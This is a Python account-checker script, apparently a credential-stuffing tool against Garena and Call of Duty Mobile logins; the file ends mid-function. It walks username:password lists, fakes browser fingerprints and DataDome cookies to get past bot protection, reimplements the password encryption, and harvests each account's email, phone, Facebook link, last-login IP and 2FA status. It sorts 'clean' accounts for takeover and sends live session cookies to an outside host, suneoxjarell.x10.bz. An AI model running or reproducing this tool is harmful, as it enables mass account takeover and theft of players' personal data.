import base64
import hashlib
import html
import json
import logging
import os
import platform
import random
import re
import subprocess
import sys
import time
import urllib
import uuid
from datetime import datetime
from urllib.parse import parse_qs, urlencode, urlparse
#from fake_useragent import UserAgent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import hashlib
import platform
import uuid
from datetime import datetime

import requests
from colorama import Fore, Style, init
from Crypto.Cipher import AES
from tqdm import tqdm

import change_cookie
# Add this near the top with other imports
from change_cookie import (generate_dynamic_cookies,
                           handle_captcha_with_fresh_datadome, save_cookies,
                           save_new_datadome, save_new_token, token_manager,
                           validate_cookies)

# Add these constants after imports

init(autoreset=True)

RED = "\033[31m"
RESET = "\033[0m"
BOLD = "\033[1;37m"  
GREEN = "\033[32m"       
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"

datenok = str(int(time.time()))

def strip_ansi_codes_jarell(text):
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)
def get_datenow():
    return datenok
def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()
def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key
def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]  
def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    encrypted_password = encrypt_aes_256_ecb(password_md5, decryption_key)
    return encrypted_password

def generate_fingerprint():
    """Generate consistent browser fingerprint"""
    # Screen properties
    screen_width = random.choice([1920, 1366, 1440, 1536, 1600])
    screen_height = random.choice([1080, 768, 900, 864, 1024])
    color_depth = random.choice([24, 30, 16])
    
    # WebGL fingerprint components
    webgl_vendor = random.choice([
        "Google Inc. (NVIDIA)",
        "Intel Inc.", 
        "AMD", 
        "NVIDIA Corporation"
    ])
    webgl_renderer = random.choice([
        "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (AMD, AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"
    ])
    
    # Audio context fingerprint
    audio_hash = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()
    
    # Canvas fingerprint
    canvas_hash = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()
    
    return {
        "screen": f"{screen_width}x{screen_height}x{color_depth}",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "language": "en-US,en;q=0.9",
        "timezone": "America/New_York",
        "webgl_vendor": webgl_vendor,
        "webgl_renderer": webgl_renderer,
        "audio_hash": audio_hash,
        "canvas_hash": canvas_hash,
        "hardware_concurrency": random.choice([4, 6, 8, 12]),
        "device_memory": random.choice([4, 8, 16]),
        "platform": "Win32"
    }


# Update the get_request_data function
def get_request_data():
    """Get request headers and cookies with refresh capability"""
    cookies = generate_dynamic_cookies()
    fingerprint = generate_fingerprint()
    
    headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': fingerprint['user_agent'],
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': fingerprint['language'],
        'X-Client-Data': base64.b64encode(json.dumps({
            'screen': fingerprint['screen'],
            'webgl': f"{fingerprint['webgl_vendor']}|{fingerprint['webgl_renderer']}",
            'audio': fingerprint['audio_hash'],
            'canvas': fingerprint['canvas_hash']
        }).encode()).decode(),
        'X-Device-Memory': str(fingerprint['device_memory']),
        'X-Hardware-Concurrency': str(fingerprint['hardware_concurrency'])
    }
    
    return cookies, headers
def get_new_datadome():
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
      #      print(f"DataDome cookie found: {datadome}")
            return datadome
        else:
            print(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            print(f"Response content: {response.text[:200]}...")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error getting DataDome cookie: {e}")
        return None
# Update the check_login function to save cookies after successful login
def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date):
    cookies["datadome"] = dataa

    # Save new datadome if it's not in the pool
    if not any(c["datadome"] == dataa for c in change_cookie.COOKIE_POOL):
        if save_new_datadome(dataa):
            print(f"{Fore.CYAN}{Style.BRIGHT}[+] Saved new datadome cookie{Style.RESET_ALL}")
    
    login_params = {
        'app_id': '100082',
        'account': account_username,
        'password': encryptedpassword,
        'redirect_uri': redrov,
        'format': 'json',
        'id': _id,
    }
    
    login_url = apkrov + f"{urlencode(login_params)}"
    
    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
        
        # Check for banned account before parsing JSON
        if "account banned" in response.text.lower():
            return f"{Fore.RED}[BANNED] Account has been banned{Style.RESET_ALL}"
            
        # Capture token_session from response cookies if available
        token_session = response.cookies.get('token_session')
        if token_session:
            cookies['token_session'] = token_session
    except requests.exceptions.ConnectionError:
        return f"{Fore.RED}[ERROR] Connection Error - Server refused the connection{Style.RESET_ALL}"
    except requests.exceptions.ReadTimeout:
        return f"{Fore.RED}[ERROR] Timeout - Server is taking too long to respond{Style.RESET_ALL}"
    except requests.RequestException as e:
        return f"{Fore.RED}[ERROR] Login Request Failed: {e}{Style.RESET_ALL}"
    
    try:
        login_json_response = response.json()
    except json.JSONDecodeError as e:
        error_msg = f"{Fore.RED}[ERROR] Login Failed: Invalid JSON response. Server Response: {response.text[:200]}...{Style.RESET_ALL}"
        # Save the problematic response for debugging
        with open("json_error.log", "a") as f:
            f.write(f"Error: {str(e)}\nResponse: {response.text}\n\n")
        return error_msg

    # Check for banned account in JSON response
    if login_json_response.get('error_code') == 'account_banned':
        return f"{Fore.RED}[BANNED] Account has been banned{Style.RESET_ALL}"
        
    if 'error_auth' in login_json_response:
        return "[FAILED] Incorrect Password"
    if 'error_params' in login_json_response:
        return "[FAILED] Invalid Parameters"
    if 'error' in login_json_response:
        return f"{Fore.RED}[FAILED] Incorrect Password{Style.RESET_ALL}"
    if not login_json_response.get('success', True):
        return "[FAILED] Login Failed"    
   
    session_key = login_json_response.get('session_key', '')
    take = cookies["datadome"]
    if not session_key:
        return "[ERROR] No session key"
        
    set_cookie = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''       
    

    # Only create auth context if we have all required components
    if all(k in cookies for k in ["token_session", "datadome"]) and sso_key:
        auth_cookies = {
            "datadome": take,
            "sso_key": sso_key,
            "token_session": cookies.get('token_session')
        }
        # Silent generation - no warnings will be shown
        dynamic_cookies = generate_dynamic_cookies({
            "datadome": take,
            "sso_key": sso_key,
            "token_session": token_manager.get_valid_token()  # Get fresh token
        })
    else:
        dynamic_cookies = generate_dynamic_cookies()
    
    # Merge cookies
    coke = cookies.copy() # Changed from change_cookie.get_cookies()
    coke["ac_session"] = "7tdtotax7wqldao9chxtp30tn4m3ggkr"
    coke["datadome"] = take
    coke["sso_key"] = sso_key

    hider = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': selected_header["User-Agent"],
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://account.garena.com/?session_key={session_key}',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    init_url = 'https://suneoxjarell.x10.bz/jajak.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})
    init_response_tox = None
    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
        init_response_tox = strip_ansi_codes_jarell(init_response.text)
       # print(init_response.text)
    except requests.RequestException as e:
        return f"[FAILED] owner_deleted_site"

    try:
        init_json_response = json.loads(init_response_tox)
    except json.JSONDecodeError:
        return "[ERROR] Failed to parse JSON response from server."

    if 'error' in init_json_response:
        return f"[ERROR] JAKOL: {init_json_response.get('error', 'unknown_error')}"
  #  print("bind check success")
    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status')  
    account_status = init_json_response.get('status', 'Unknown')
    country = "N/A"
    last_login = "N/A"
    last_login_where = "N/A"
    avatar_url = "N/A"
    fb = "N/A"
    eta = "N/A"
    fbl = "N/A"
    mobile = "N/A"
    facebook = "False"
    shell = "0"
    count = "UNKNOWN"
    ipk = "1.1.1.1"    
    email = "N/A"
    ipc = "N/A"
    email_verified = "False"
    authenticator_enabled = False
    two_step_enabled = False

    for binding in bindings:
        if "Country:" in binding:
            country = binding.split("Country:")[-1].strip()
        elif "LastLogin:" in binding:
            last_login = binding.split("LastLogin:")[-1].strip()       
        elif "LastLoginFrom:" in binding:
            last_login_where = binding.split("LastLoginFrom:")[-1].strip()            
        elif "ckz:" in binding:
            count = binding.split("ckz:")[-1].strip()       
        elif "LastLoginIP:" in binding:
            ipk = binding.split("LastLoginIP:")[-1].strip()                                      
        elif "Las:" in binding:
            ipc = binding.split("Las:")[-1].strip()                                    
        elif "Garena Shells:" in binding:
            shell = binding.split("Garena Shells:")[-1].strip()
        elif "Facebook Account:" in binding:
            fb = binding.split("Facebook Account:")[-1].strip()
            facebook = "True"
        elif "Fb link:" in binding:
            fbl = binding.split("Fb link:")[-1].strip()
        elif "Avatar:" in binding:
            avatar_url = binding.split("Avatar:")[-1].strip()
        elif "Mobile Number:" in binding:
            mobile = binding.split("Mobile Number:")[-1].strip()                  
        elif "tae:" in binding:
            email_verified = "True" if "Yes" in binding else "False"
        elif "eta:" in binding:
            email = binding.split("eta:")[-1].strip()
        elif "Authenticator:" in binding:
            authenticator_enabled = "True" if "Enabled" in binding else "False"
        elif "Two-Step Verification:" in binding:
            two_step_enabled = "True" if "Enabled" in binding else "False"
    cookies["sso_key"] = sso_key            
    head = {
    "Host": "auth.garena.com",
    "Connection": "keep-alive",
    "Content-Length": "107",
    "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    "Accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": selected_header["sec-ch-ua-platform"],
    "sec-ch-ua-mobile": "?1",
    "User-Agent": selected_header["User-Agent"],
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Origin": "https://auth.garena.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9"
    }               
    data = {
        "client_id": "100082",
        "response_type": "token",
        "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "format": "json",
        "id": _id
    }            
    try:       
        grant_url = "https://auth.garena.com/oauth/token/grant"        
        reso = requests.post(grant_url, headers=head, data=data, cookies=cookies)
        
        # Update token_session from grant response
        grant_token = reso.cookies.get('token_session')
        if grant_token:
            cookies['token_session'] = grant_token
            token_manager.token = grant_token
            token_manager.last_refresh = time.time()
            save_new_token(grant_token)  # Explicitly save the grant token
  #      print("token check success")
        if not reso:
            return "[ERROR] No response from server."       
        try:
            data = reso.json()
         #   print(data)
        except ValueError:
            return "Failed to parse response as JSON."                    
        if "error" in data:            
            return f"{Fore.RED}[ERROR] {data['error']}{Style.RESET_ALL}"
        else:
            if "access_token" in data:
                token_session = cookies.get('token_session')
                access_token = data["access_token"]
                new_data = get_new_datadome()
                tae = show_level(access_token, selected_header, sso_key, token_session, new_data, cookies)
               # print(tae)
                if "[FAILED]" in tae:
                    
                    return tae
                parts = tae.split("|")

                official = parts[0]  # 'official dong'
                codm_level = parts[1]  # '288'
                codm_region = parts[2]  # 'PH'
                uid = parts[3]  # '106011761797264'
    
    # Now, use these variables as needed
                codm_nickname = official  # Assuming 'official' is the codm_nickname

                connected_games = []

                if not (uid and codm_nickname and codm_level and codm_region):
                    connected_games.append("No CODM account found")
                else:
                    connected_games.append(f"{uid} - CODM ({codm_region}) - {codm_nickname} - {Style.RESET_ALL}LEVEL:{Style.RESET_ALL} {Fore.YELLOW}{codm_level}{Style.RESET_ALL}")
                passed = format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, None, fb, fbl, email, date, account_username, password, count, ipk, ipc)
                return passed
            else:
                return f"{Fore.RED}[ERROR] 'access_token' not found in response {data}{Style.RESET_ALL}"               
    except requests.RequestException as e:
        return f"{Fore.RED}[ERROR] cant request token grant {e}{Style.RESET_ALL}"



def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }


    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"]
    }

    cookie.update({
        "datadome": newdate,  # Make sure `newdate` is defined before using it
        "sso_key": sso,
        "token_session": token
    })

    # [Previous headers and cookie setup...]

    response = requests.get(url, headers=headers, cookies=cookie, params=params)

    if response.status_code == 200:
        try:
            parsed_url = urlparse(response.url)
            query_params = parse_qs(parsed_url.query)
            extracted_token = query_params.get("token", [None])[0]

            if extracted_token:
                check_login_headers = {
                    # [Headers setup...]
                }

                check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
                check_login_response = requests.get(check_login_url, headers=check_login_headers)

                try:
                    data = check_login_response.json()
                except json.JSONDecodeError as e:
                    # Save the error for debugging
                    with open("codm_json_error.log", "a") as f:
                        f.write(f"Error parsing CODM response: {str(e)}\n")
                        f.write(f"Response text: {check_login_response.text[:500]}\n\n")
                    return "[FAILED] invalid_json_response"

                if "user" in data:
                    # Check for banned status
                    if data.get("user", {}).get("status", "").lower() == "banned":
                        return "[BANNED] Account is banned in CODM"
                        
                    uid = data["user"]["uid"]
                    codm_nickname = data["user"]["codm_nickname"]
                    codm_level = data["user"]["codm_level"]
                    codm_region = data["user"]["region"]

                    return f"{codm_nickname}|{codm_level}|{codm_region}|{uid}"
                else:
                    return "[FAILED] no_codm_account"
        except Exception as e:
            return f"[ERROR] Processing response: {str(e)}"
    
    return f"[FAILED] no_codm_account (Status: {response.status_code})"

def format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, 
                 email_verified, authenticator_enabled, two_step_enabled, connected_games, 
                 is_clean, fb, fbl, email, date, username, password, count, ipk, ipc):

    # Determine bind status
    mobile_bound = mobile != "N/A"
    email_bound = email_verified == "True"
    clean_status = "Clean" if (not mobile_bound and not email_bound) else "Not Clean"
    
    # Format Facebook link
    facebook_link = fbl if fbl != "N/A" and fb != "N/A" else "N/A"
    
    # Initialize CODM info with default values
    codm_level = "N/A"
    region = "N/A"
    nickname = "N/A"
    uid = "N/A"
    
    # Parse CODM info if available
    if connected_games and "CODM" in connected_games[0]:
        try:
            # Example connected_games format: "551801752 - CODM (TH) - ggfourtv452 - LEVEL:19"
            game_parts = connected_games[0].split(" - ")
            if len(game_parts) >= 4:
                uid = game_parts[0]
                region = game_parts[1].replace("CODM (", "").replace(")", "")
                nickname = game_parts[2]
                codm_level = game_parts[3].replace("LEVEL:", "").strip()
        except Exception as e:
            print(f"Error parsing CODM info: {e}")
    
    # Format CODM info section
    codm_info = f"""
{Fore.GREEN}╔══════════════════════════════════════════════════╗
{Fore.GREEN}║ 🎮 {Fore.CYAN}CALL OF DUTY: MOBILE ACCOUNT INFORMATION{Fore.GREEN}  ║
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ • UID: {Fore.CYAN}{uid:<45}{Fore.GREEN}║
{Fore.GREEN}║ • IGN: {Fore.CYAN}{nickname:<45}{Fore.GREEN}║  
{Fore.GREEN}║ • Account Level: {Fore.CYAN}{codm_level:<36}{Fore.GREEN}║
{Fore.GREEN}║ • Game: {Fore.CYAN}CODM ({region}){' '*(36-len(region))}{Fore.GREEN}║
{Fore.GREEN}╚══════════════════════════════════════════════════╝
""" if uid != "N/A" else f"{Fore.GREEN}║ {Fore.RED}• No CODM Account Found{' '*27}{Fore.GREEN}║"

    mess = f"""
{Fore.GREEN}╔══════════════════════════════════════════════════╗
{Fore.GREEN}║ 🔒 {Fore.CYAN}ACCOUNT INFORMATION {' '*24}{Fore.GREEN}║
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ • Login Status: {Fore.GREEN}Successful ✅{' '*27}{Fore.GREEN}║
{Fore.GREEN}║ • Account: {Fore.CYAN}{username}:{password}{' '*(36-len(username)-len(password))}{Fore.GREEN}║
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ • Country: {Fore.CYAN}{country:<40}{Fore.GREEN}║
{Fore.GREEN}║ • Shells: {Fore.CYAN}{shell:<41}{Fore.GREEN}║
{Fore.GREEN}║ • Mobile No: {Fore.CYAN}{mobile:<38}{Fore.GREEN}║
{Fore.GREEN}║ • Email: {Fore.CYAN}{email}{' '*(40-len(email))}{Fore.GREEN}║
{Fore.GREEN}║   {Fore.GREEN if email_verified == "True" else Fore.RED}{"✓ Verified" if email_verified == "True" else "✗ Not Verified"}{' '*37}{Fore.GREEN}║
{Fore.GREEN}║ • Facebook Username: {Fore.CYAN}{fb:<29}{Fore.GREEN}║
{Fore.GREEN}║ • Facebook Link: {Fore.CYAN}{facebook_link:<31}{Fore.GREEN}║
{codm_info}
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ 🔗 {Fore.CYAN}BIND STATUS {' '*35}{Fore.GREEN}║
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ • Mobile Binded: {Fore.GREEN if mobile_bound else Fore.RED}{mobile_bound}{' '*(35-len(str(mobile_bound)))}{Fore.GREEN}║
{Fore.GREEN}║ • Email Verified: {Fore.GREEN if email_bound else Fore.RED}{email_bound}{' '*(34-len(str(email_bound)))}{Fore.GREEN}║
{Fore.GREEN}║ • Facebook Linked: {Fore.GREEN if facebook == "True" else Fore.RED}{facebook}{' '*(32-len(str(facebook)))}{Fore.GREEN}║
{Fore.GREEN}║ • 2FA Enabled: {Fore.GREEN if two_step_enabled == "True" else Fore.RED}{two_step_enabled}{' '*(34-len(str(two_step_enabled)))}{Fore.GREEN}║
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ ⏳ {Fore.CYAN}LAST ACTIVITY {' '*33}{Fore.GREEN}║
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ • Last Login: {Fore.CYAN}{last_login:<36}{Fore.GREEN}║
{Fore.GREEN}║ • Last Login From: {Fore.CYAN}{last_login_where:<30}{Fore.GREEN}║
{Fore.GREEN}║ • Last Login IP: {Fore.CYAN}{ipk:<33}{Fore.GREEN}║
{Fore.GREEN}║ • Last Login Country: {Fore.CYAN}{ipc:<28}{Fore.GREEN}║
{Fore.GREEN}╠══════════════════════════════════════════════════╣
{Fore.GREEN}║ 🛡️  Account Status: {Fore.GREEN + Style.BRIGHT if clean_status == "Clean" else Fore.RED}{clean_status}{' '*(32-len(clean_status))}{Fore.GREEN}║
{Fore.GREEN}╚══════════════════════════════════════════════════╝
{Fore.GREEN}              Checked by @SerperHex
""".strip()

    # Save to appropriate files
    output_dir = "output"   
    os.makedirs(output_dir, exist_ok=True)

    clean_file = os.path.join(output_dir, f"clean_{date}.txt")
    notclean_file = os.path.join(output_dir, f"notclean_{date}.txt")
    high_level_file = os.path.join(output_dir, f"high_level_codm_{date}.txt")

    file_to_save = clean_file if clean_status == "Clean" else notclean_file
    resalt = strip_ansi_codes_jarell(mess)

    with open(file_to_save, "a", encoding="utf-8") as f:
        f.write(resalt + "\n" + "-" * 50 + "\n")
        
    # Save high level CODM accounts separately
    if uid != "N/A" and codm_level.isdigit() and int(codm_level) >= 100:
        with open(high_level_file, "a", encoding="utf-8") as f:
            f.write(resalt + "\n" + "-" * 50 + "\n")
        
    return mess

def _get_current_ip():
    """Get current public IP address"""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def check_account(username, password, date):
    try:
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))
        cookies, headers = get_request_data()
        
        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }
        
        login_url = "https://auth.garena.com/api/prelogin"
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers)
        
        # Enhanced CAPTCHA detection
        response_text = response.text.lower()
        if "captcha" in response_text or "security check" in response_text:
            print(f"\033[1;33m[+] Retrying please wait! when you see this info 5 times try to exit <- and try again \033[0m")
            return check_account(username, password, date)  # Retry with new IP
            
        if response.status_code == 200:
            data = response.json()
            v1 = data.get('v1')
            v2 = data.get('v2')
            prelogin_id = data.get('id')

            if not all([v1, v2, prelogin_id]):
                return f"{Fore.RED}[FAILED] Account Doesn't Exist{Style.RESET_ALL}"            
            new_datadome = response.cookies.get('datadome', cookies.get('datadome'))           
            encrypted_password = getpass(password, v1, v2)
            if not new_datadome:
                return f"{Fore.RED}[ERROR] Status: Missing updated cookies{Style.RESET_ALL}"            
            if "error" in data or data.get("error_code"):
                return f"{Fore.RED}[ERROR] Status: {data.get('error', 'Unknown error')}{Style.RESET_ALL}"
            else:
                tre = check_login(username, random_id, encrypted_password, password, headers, cookies, new_datadome, date)  
                return tre
        else:
            # Define output files
            #output_dir = "output"
            #os.makedirs(output_dir, exist_ok=True)
            #captcha_file = os.path.join(output_dir, f"captcha_{date}.txt")
            #with open(captcha_file, 'a', encoding='utf-8') as f:
                        #f.write(f"{username}:{password}\n")
            
            # Pause execution and wait for user input
            print(f"\033[1;31m[+] IF YOUR SEE THIS INFO 5 TIMES!\033[0m")
            print(f"\033[1;31m[+] PLEASE CHANGE YOUR SERVER! or enter\033[0m")
            input("Press Enter to continue after changing your IP address...")
            return check_account(username, password, date)  # Retry after IP change

    except Exception as e:
        return f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}"

# Add this function to your GarenaCheckerFullinfo.py (near other helper functions)
def get_failure_reason(result):
    """Extracts and formats the failure reason from the result string"""
    if not isinstance(result, str):
        return "Unknown error"
    
    # Common error patterns to look for
    error_patterns = [
        ("[FAILED]", ":"),  # Format: "[FAILED] Reason: details"
        ("[ERROR]", ":"),    # Format: "[ERROR] Type: details"
        ("Status:", None),   # Format: "Status: details"
        ("error", None),     # Generic error
        ("Exception", None)  # Python exceptions
    ]

    # Try to extract the most specific reason first
    for prefix, separator in error_patterns:
        if prefix in result:
            if separator:
                parts = result.split(separator, 1)
                if len(parts) > 1:
                    return parts[-1].strip()
            return result.split(prefix)[-1].strip()
    
    # Fallback to simple cleaning if no patterns match
    cleaned = result.replace("[", "").replace("]", "").strip()
    return cleaned if cleaned else "Unknown error"

# Then update the bulk_check function to use it:
def bulk_check(file_path):
    successful_count = 0
    failed_count = 0
    captcha_count = 0
    error_count = 0
    total_accounts = 0
    date = get_datenow()
    
    # Define output files
    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)

    error_file = os.path.join(output_dir, f"error_accounts_{date}.txt")
    failed_file = os.path.join(output_dir, f"failed_{date}.txt")
    captcha_file = os.path.join(output_dir, f"captcha_{date}.txt")
    clean_file = os.path.join(output_dir, f"clean_{date}.txt")
    notclean_file = os.path.join(output_dir, f"notclean_{date}.txt")
    failed_login_file = os.path.join(output_dir, f"failed_{date}.txt")  # New file for failed logins

    # Clear previous files
    for f in [error_file, failed_file, captcha_file, clean_file, notclean_file, failed_login_file]:
        if os.path.exists(f):
            os.remove(f)

    print(f"\n{GREEN}[+] {RESET}Processing file: {file_path}")
    
    def write_error_account(username, password, error_msg=""):
        """Helper function to write error accounts consistently"""
        with open(error_file, 'a', encoding='utf-8') as f:
            line = f"{username}:{password}"
            f.write(line + "\n")
            
    def write_failed_login(username, password, reason=""):
        """Helper function to write failed login accounts"""
        with open(failed_login_file, 'a', encoding='utf-8') as f:
            line = f"{username}:{password}"
            if reason:
                # Strip ANSI codes from the reason before writing
                clean_reason = strip_ansi_codes_jarell(reason)
                line += f" - {clean_reason}"
            f.write(line + "\n")

    with open(file_path, 'r', encoding='utf-8') as infile:
